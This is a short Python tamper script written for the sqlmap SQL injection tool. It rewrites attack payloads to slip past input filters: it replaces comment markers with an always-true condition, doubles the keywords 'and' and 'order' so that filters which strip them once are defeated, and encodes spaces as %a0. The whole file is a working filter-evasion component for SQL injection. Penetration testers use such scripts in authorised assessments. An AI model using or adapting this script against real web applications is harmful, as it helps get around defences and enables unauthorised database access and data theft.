#!/usr/bin/env python
"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re

from lib.core.enums import PRIORITY


__priority__ = PRIORITY.HIGHEST
def dependencies():
    pass

def tamper(payload,**kwargs):
    payload = re.sub(r"(?i)-- "," and '1'='1",payload)
    payload = re.sub(r"(?i)#"," and '1'='1",payload)
    payload = re.sub(r"(?i)and","aANDnd",payload)
    payload = re.sub(r"(?i)order","oORrder",payload)
    payload = re.sub(r"(?i) ","%a0",payload)

    return payload